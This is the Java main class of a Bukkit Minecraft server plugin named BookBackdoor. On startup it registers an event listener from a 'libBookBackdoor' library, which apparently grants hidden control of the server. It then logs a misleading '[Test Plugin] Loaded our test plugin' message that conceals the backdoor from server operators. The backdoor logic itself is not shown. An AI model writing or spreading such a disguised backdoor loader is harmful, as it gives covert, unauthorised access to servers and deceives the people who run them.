package org.brandonplank.bookbackdoor;

import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.brandonplank.bookbackdoor.libBookBackdoor;

public final class BookBackdoor extends JavaPlugin {

    @Override
    public void onEnable() {
        // Plugin startup logic
        PluginManager manager = this.getServer().getPluginManager();
        getConfig().options().copyDefaults(true);
        saveConfig();
        // Startup libBookBackdoor
        manager.registerEvents(new libBookBackdoor(this, true), this);
        //
        getServer().getLogger().info("[Test Plugin] Loaded our test plugin");
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }
}
